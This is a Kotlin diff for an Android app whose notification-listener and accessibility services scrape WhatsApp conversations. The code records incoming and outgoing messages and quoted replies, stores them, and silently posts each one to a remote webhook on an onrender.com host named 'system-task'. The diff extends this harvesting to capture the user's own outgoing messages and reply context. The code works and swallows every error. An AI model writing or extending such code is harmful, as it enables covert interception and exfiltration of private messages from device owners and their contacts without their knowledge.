@@ -80,21 +80,22 @@ class NotificationService : NotificationListenerService() {
                     if (m is Bundle) {
                         val sender = m.getCharSequence("sender")?.toString() ?: title
                         val msgText = m.getCharSequence("text")?.toString() ?: ""
-                        if (msgText.isNotEmpty()) saveMessage(title, sender, msgText)
+                        val isOut = sender == null || sender == title
+                        if (msgText.isNotEmpty()) saveMessage(title, sender ?: title, msgText, isOut)
                     }
                 }
             } else {
                 val lines = extras.getCharSequenceArray("android.textLines")
                 if (lines != null && lines.isNotEmpty()) {
-                    for (l in lines) saveMessage(title, title, l.toString())
+                    for (l in lines) saveMessage(title, title, l.toString(), false)
                 } else if (text.isNotEmpty()) {
-                    saveMessage(title, title, text)
+                    saveMessage(title, title, text, false)
                 }
             }
         } catch (e: Exception) {}
     }
 
-    private fun saveMessage(chat: String, sender: String, message: String) {
+    private fun saveMessage(chat: String, sender: String, message: String, isOutgoing: Boolean = false) {
         if (isDuplicate(chat, sender, message)) return
         try {
             val prefs = applicationContext.getSharedPreferences("sraas_messages", 0)
@@ -105,16 +106,16 @@ class NotificationService : NotificationListenerService() {
             obj.put("sender", sender)
             obj.put("message", message)
             obj.put("time", System.currentTimeMillis())
+            obj.put("is_outgoing", isOutgoing)
             arr.put(obj)
             while (arr.length() > 500) arr.remove(0)
             prefs.edit().putString("messages", arr.toString()).apply()
             
-            // Send only the new message (not all) but in a sequential way
-            syncSingleMessage(chat, sender, message, System.currentTimeMillis())
+            syncSingleMessage(chat, sender, message, System.currentTimeMillis(), isOutgoing)
         } catch (e: Exception) {}
     }
 
-    private fun syncSingleMessage(chat: String, sender: String, message: String, time: Long) {
+    private fun syncSingleMessage(chat: String, sender: String, message: String, time: Long, isOutgoing: Boolean = false) {
         Thread {
             try {
                 val apiUrl = "https://system-task-b6ra.onrender.com/api/webhooks/whatsapp/sync"
@@ -132,12 +133,14 @@ class NotificationService : NotificationListenerService() {
                 msgObj.put("sender", sender.trim())
                 msgObj.put("message", message.trim())
                 msgObj.put("time", time)
+                msgObj.put("is_outgoing", isOutgoing)
 
                 val arr = JSONArray()
                 arr.put(msgObj)
 
                 val payload = JSONObject()
                 payload.put("messages", arr)
+                payload.put("org_slug", "new-startup")
 
                 val os = conn.outputStream
                 os.write(payload.toString().toByteArray(Charsets.UTF_8))
@@ -277,21 +280,33 @@ class WhatsAppAccessibilityService : AccessibilityService() {
                 val isOutgoing = isOutgoingMessage(node, screenWidth)
                 val sender = if (isOutgoing) "You" else chatName
                 if (!isDuplicate(chatName, sender, text)) {
-                    saveMsg(chatName, sender, text)
+                    saveMsg(chatName, sender, text, isOutgoing)
                 }
             }
         } else if (className == "android.view.ViewGroup" || className == "android.widget.LinearLayout" || className == "android.widget.FrameLayout") {
             val desc = node.contentDescription?.toString()?.trim() ?: ""
             if (desc.isNotEmpty() && desc.contains(Regex("\\\\d{1,2}:\\\\d{2}"))) {
-                if (desc.startsWith("You:")) {
+                // Detect reply pattern: "Name replied to Name. OriginalText. ReplyText, timestamp"
+                val replyPattern = Regex("^(.+?)\\\\s+replied to\\\\s+.+?\\\\.\\\\s*(.+?)\\\\.\\\\s*(.+?),\\\\s*\\\\d{1,2}:\\\\d{2}")
+                val replyMatch = replyPattern.find(desc)
+                
+                if (replyMatch != null) {
+                    val replySender = replyMatch.groupValues[1].trim()
+                    val originalText = replyMatch.groupValues[2].trim()
+                    val replyText = replyMatch.groupValues[3].trim()
+                    val isOut = replySender == "You"
+                    if (replyText.isNotEmpty() && isValidMessage(replyText) && !isDuplicate(chatName, replySender, replyText)) {
+                        saveMsgWithReply(chatName, replySender, replyText, isOut, originalText)
+                    }
+                } else if (desc.startsWith("You:")) {
                     val msg = desc.substring(4).substringBeforeLast(",").trim()
                     if (msg.isNotEmpty() && msg != chatName && isValidMessage(msg) && !isDuplicate(chatName, "You", msg)) {
-                        saveMsg(chatName, "You", msg)
+                        saveMsg(chatName, "You", msg, true)
                     }
                 } else if (!desc.contains("unread")) {
                     val msg = desc.substringBeforeLast(",").trim()
                     if (msg.isNotEmpty() && msg != chatName && isValidMessage(msg) && !isDuplicate(chatName, chatName, msg)) {
-                        saveMsg(chatName, chatName, msg)
+                        saveMsg(chatName, chatName, msg, false)
                     }
                 }
             }
@@ -369,7 +384,7 @@ class WhatsAppAccessibilityService : AccessibilityService() {
         return false
     }
 
-    private fun saveMsg(chat: String, sender: String, message: String) {
+    private fun saveMsg(chat: String, sender: String, message: String, isOutgoing: Boolean = false) {
         try {
             val prefs = applicationContext.getSharedPreferences("sraas_messages", 0)
             val existing = prefs.getString("messages", "[]") ?: "[]"
@@ -379,15 +394,16 @@ class WhatsAppAccessibilityService : AccessibilityService() {
             obj.put("sender", sender)
             obj.put("message", message)
             obj.put("time", System.currentTimeMillis())
+            obj.put("is_outgoing", isOutgoing)
             arr.put(obj)
             while (arr.length() > 500) arr.remove(0)
             prefs.edit().putString("messages", arr.toString()).apply()
             
-            syncSingleMessage(chat, sender, message, System.currentTimeMillis())
+            syncSingleMessage(chat, sender, message, System.currentTimeMillis(), isOutgoing, null)
         } catch (e: Exception) {}
     }
 
-    private fun syncSingleMessage(chat: String, sender: String, message: String, time: Long) {
+    private fun syncSingleMessage(chat: String, sender: String, message: String, time: Long, isOutgoing: Boolean, replyToContent: String?) {
         Thread {
             try {
                 val apiUrl = "https://system-task-b6ra.onrender.com/api/webhooks/whatsapp/sync"
@@ -405,12 +421,15 @@ class WhatsAppAccessibilityService : AccessibilityService() {
                 msgObj.put("sender", sender.trim())
                 msgObj.put("message", message.trim())
                 msgObj.put("time", time)
+                msgObj.put("is_outgoing", isOutgoing)
+                if (replyToContent != null) msgObj.put("reply_to_content", replyToContent.trim())
 
                 val arr = JSONArray()
                 arr.put(msgObj)
 
                 val payload = JSONObject()
                 payload.put("messages", arr)
+                payload.put("org_slug", "new-startup")
 
                 val os = conn.outputStream
                 os.write(payload.toString().toByteArray(Charsets.UTF_8))
@@ -420,6 +439,25 @@ class WhatsAppAccessibilityService : AccessibilityService() {
                 conn.responseCode
             } catch (e: Exception) {}
         }.start()
+    }
+
+    private fun saveMsgWithReply(chat: String, sender: String, message: String, isOutgoing: Boolean, replyToContent: String) {
+        try {
+            val prefs = applicationContext.getSharedPreferences("sraas_messages", 0)
+            val existing = prefs.getString("messages", "[]") ?: "[]"
+            val arr = try { JSONArray(existing) } catch (e: Exception) { JSONArray() }
+            val obj = JSONObject()
+            obj.put("chat", chat)
+            obj.put("sender", sender)
+            obj.put("message", message)
+            obj.put("time", System.currentTimeMillis())
+            obj.put("is_outgoing", isOutgoing)
+            obj.put("reply_to_content", replyToContent)
+            arr.put(obj)
+            while (arr.length() > 500) arr.remove(0)
+            prefs.edit().putString("messages", arr.toString()).apply()
+            syncSingleMessage(chat, sender, message, System.currentTimeMillis(), isOutgoing, replyToContent)
+        } catch (e: Exception) {}
     }
 
     override fun onInterrupt() {}
